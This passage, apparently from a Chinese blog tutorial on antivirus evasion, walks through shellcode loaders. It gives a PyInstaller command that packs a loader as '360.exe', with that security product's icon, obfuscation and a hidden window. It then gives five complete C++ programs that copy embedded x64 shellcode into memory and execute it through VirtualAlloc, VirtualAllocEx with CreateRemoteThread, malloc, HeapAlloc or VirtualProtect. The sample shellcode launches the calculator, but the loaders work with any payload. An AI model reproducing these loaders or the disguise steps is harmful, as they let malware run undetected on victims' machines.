None)</code>调用<code>CreateThread</code>创建一个新线程,将刚才分配的内存作为线程的起始地址</li><li><code>WaitForSingleObject(h, ctypes.c_int(0xFFFFFFFF))</code>:<code>h</code> 创建的线程的句柄,<code>ctypes.c_int(0xFFFFFFFF)</code>表示无限期等待这个线程完成</li></ol><h4 id="Pyinstaller打包"><a href="#Pyinstaller打包" class="headerlink" title="Pyinstaller打包"></a>Pyinstaller打包</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python38 -m pip install pyinstaller tinyaes</span><br><span class="line">-F 打包成一个exe文件</span><br><span class="line">-w不显示黑窗口 (默认会显示) , 也可以用--noconsole参数</span><br><span class="line">-i指定图标 , .ico文件或者是exe文件 , 会自动提取exe文件的图标 (不推荐图标)</span><br><span class="line">-n指定打包好的文件名</span><br><span class="line">--clean清除上一次打包的文件</span><br><span class="line">--keycjiurfe11a混淆代码功能 (需要安装tinyaes)</span><br><span class="line"></span><br><span class="line">pyinstaller -F -w shellcode.py -i <span class="string">&quot;D:\\Penetration\\BypassAV\\SigThief-master\\sign_exe\\360.exe&quot;</span> -n 360.exe --clean --key cbeugtbutrh</span><br></pre></td></tr></table></figure><p>打包好的程序在<code>dist</code>目录下 , <code>dist</code>是<code>distribution</code>的简写 .为发行版本.</p><p><strong>py不支持交叉编译 ,就是Windows你只能打包成exe , 不能打包成Linux上的可执行二进制文件</strong></p><h2 id="内存申请函数"><a href="#内存申请函数" class="headerlink" title="内存申请函数"></a>内存申请函数</h2><h3 id="VirtualAlloc函数-1"><a href="#VirtualAlloc函数-1" class="headerlink" title="VirtualAlloc函数"></a>VirtualAlloc函数</h3><h3 id="VirtualAllocEx函数"><a href="#VirtualAllocEx函数" class="headerlink" title="VirtualAllocEx函数"></a>VirtualAllocEx函数</h3><h4 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h4><p><code>VirtualAllocEx</code>和<code>VirtualAlloc</code>都是Windows操作系统中的内存分配函数,但他们在使用场景和功能上有一些不同.</p><ol><li><p><code>VirtualAlloc</code>用于在当前进程的虚拟地址空间中分配内存.他是一个进程内存分配函数,用于动态分配内存块,供当前进程使用.可以通过设置内存保护属性来指定分配内存的权限,例如:可读写、可执行等.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LPVOID pMemory = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">4096</span>, MEM_COMMIT, PAGE_READWRITE);</span><br></pre></td></tr></table></figure></li><li><p><code>VirtualAllocEx</code>用于在其他进程的虚拟地址空间中分配内存,他是一个跨进程的内存分配函数,通常与其他进程间的数据交换、远程线程创建等操作一起使用.可以使用此函数向其他进程注入代码、数据等.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LPVOID pRemoteMemory = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span class="number">4096</span>, MEM_COMMIT, PAGE_READWRITE);</span><br></pre></td></tr></table></figure></li></ol><p>总结而言,<code>VirtualAlloc</code>主要用于当前进程内分配内存,而<code>VirtualAllocEx</code>则主要用于在其他进程内分配内存.他们都提供了灵活的内存分配方式,但需要根据实际需求选择适当的函数.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">    <span class="comment">// 获取要执行的进程句柄(当前进程)</span></span><br><span class="line">    HANDLE hProcess = <span class="built_in">GetCurrentProcess</span>();</span><br><span class="line">    <span class="comment">// 在目标进程中分配可读可写不可执行的内存</span></span><br><span class="line">    LPVOID pRemoteMemory = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>,<span class="built_in">sizeof</span>(buf), MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (pRemoteMemory != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        <span class="comment">// 将Shellcode复制到目标进程的内存中</span></span><br><span class="line">        <span class="built_in">WriteProcessMemory</span>(hProcess, pRemoteMemory, buf, <span class="built_in">sizeof</span>(buf), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 修改内存属性为可执行</span></span><br><span class="line">        DWORD oldProtect;</span><br><span class="line">        <span class="built_in">VirtualProtectEx</span>(hProcess, pRemoteMemory, <span class="built_in">sizeof</span>(buf), PAGE_EXECUTE_READ, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在目标进程中创建线程执行Shellcode</span></span><br><span class="line">        HANDLE hRemoteThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pRemoteMemory, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(hRemoteThread, INFINITE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 释放目标进程中的内存</span></span><br><span class="line">        <span class="built_in">VirtualFreeEx</span>(hProcess, pRemoteMemory, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ConsoleApplication1.cpp : 此文件包含 &quot;main&quot; 函数.程序执行将在此处开始并结束.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">    <span class="comment">// 使用malloc分配内存</span></span><br><span class="line">    <span class="type">void</span>* pMemory = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">if</span> (pMemory != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// 将Shellcode复制到内存中</span></span><br><span class="line">        <span class="built_in">memcpy</span>(pMemory, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">        <span class="comment">// 将内存标记为可执行</span></span><br><span class="line">        DWORD oldProtect;</span><br><span class="line">        <span class="built_in">VirtualProtect</span>(pMemory, <span class="built_in">sizeof</span>(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">        <span class="comment">// 执行Shellcode</span></span><br><span class="line">        ((<span class="built_in">void</span>(*)())pMemory)();</span><br><span class="line">        <span class="comment">//释放内存</span></span><br><span class="line">        <span class="built_in">free</span>(pMemory);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="HeapAlloc函数"><a href="#HeapAlloc函数" class="headerlink" title="HeapAlloc函数"></a>HeapAlloc函数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ConsoleApplication1.cpp : 此文件包含 &quot;main&quot; 函数.程序执行将在此处开始并结束.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">    HANDLE hHrp = <span class="built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    PVOID Mptr = <span class="built_in">HeapAlloc</span>(hHrp, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>(Mptr, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">    DWORD dwThreadId = <span class="number">0</span>;</span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>,(LPTHREAD_START_ROUTINE)Mptr, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;dwThreadId);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="内存属性修改"><a href="#内存属性修改" class="headerlink" title="内存属性修改"></a>内存属性修改</h3><p>使用<code>VirtualAlloc</code>函数分配可读可写不可执行的内存,填充shellcode,然后修改内存属性为可执行,最后执行shellcode</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">    <span class="comment">// 分配可读可写不可执行的内存</span></span><br><span class="line">    LPVOID pMemory = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (pMemory != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        <span class="comment">// 将shellcode复制到分配的内存中</span></span><br><span class="line">        std::<span class="built_in">memcpy</span>(pMemory, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">        <span class="comment">// 修改内存属性为可执行</span></span><br><span class="line">        DWORD oldProtect;</span><br><span class="line">        <span class="built_in">VirtualProtect</span>(pMemory, <span class="built_in">sizeof</span>(buf), PAGE_EXECUTE_READ, &amp;oldProtect);</span><br><span class="line">        ((<span class="built_in">void</span>(*)())pMemory)();</span><br><span class="line">        <span class="comment">// 释放内存</span></span><br><span class="line">        <span class="built_in">VirtualFree</span>(pMemory, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="释放内存"><a href="#释放内存" class="headerlink" title="释放内存"></a>释放内存</h3><blockquote><p><code>VirtualFree</code>是⼀个<code>WinAPI</code>,用于释放之前分配的内存.该函数应仅在有效载荷完全执行完成后调用,否则可能会释放有效载荷的内容并使进程崩溃.</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">VirtualFree</span><span class="params">(</span></span><br><span class="line"><span class="params"> [in] LPVOID lpAddress,</span></span><br><span class="line"><span class="params"> [in] SIZE_T dwSize,</span></span><br><span class="line"><span class="params"> [in] DWORD dwFreeType</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>VirtualFree采用要释放的分配内存的基地址(lpAddress)、要释放的内存大小(dwSize)和释放操作的类型(dwFreeType可以是以下标志之⼀)：</p><ul><li><p><code>MEM_DECOMMIT</code>  该<code>VirtualFree</code>调用将释放物理内存,而不会释放与其链接的虚拟地址空间. 因此,虚拟地址空间将来仍可用于分配内存,但与其链接的页面不再受物理内存支持.</p></li><li><p><code>MEM_RELEASE</code> 虚拟地址空间和与分配的虚拟内存关联的物理内存均被释放.请注意,根据 Microsoft 的文档,使用此标志时,参数dwSize必须为 0</p></li></ul><h2 id="注入执行"><a href="#注入执行" class="headerlink" title="注入执行"></a>注入执行</h2><h3 id="指针执行"><a href="#指针执行" class="headerlink" title="指针执行"></a>指针执行</h3><h4 id="申请内存"><a href="#申请内存" class="headerlink" title="申请内存"></a>申请内存</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">    <span class="comment">// 分配内存</span></span><br><span class="line">    LPVOID Memory = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (Memory == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将shellcode拷贝进内存</span></span><br><span class="line">    <span class="built_in">memcpy</span>(Memory, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">    <span class="comment">// 执行shellcode</span></span><br><span class="line">    ((<span class="built_in">void</span>(*)())Memory)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>(void(*)())</code>是一个函数指针类型的强制转换, 该函数指针指向一个没有参数且返回值类型为<code>void</code>的函数,也就是说这行代码将<code>Memory</code>的地址转换为一个函数指针,然后调用该指针所指向的函数</p><h4 id="修改内存属性"><a href="#修改内存属性" class="headerlink" title="修改内存属性"></a>修改内存属性</h4><p>既然<code>buf</code>都已经在内存当中了,为什么我们还需要使用<code>VirtualAlloc()</code>去申请内存呢?直接删掉<code>VirtualAlloc()</code>后执行.发现运行后无反应.这是因为字符串在内存中只有可读的权限并没有可执行的权限,所以我们可以修改内存属性.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">    DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 修改数据内存属性为可执行</span></span><br><span class="line">    <span class="built_in">VirtualProtect</span>(buf, <span class="built_in">sizeof</span>(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    <span class="comment">// 执行shellcode</span></span><br><span class="line">    ((<span class="built_in">void</span>(*)())&amp;buf)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 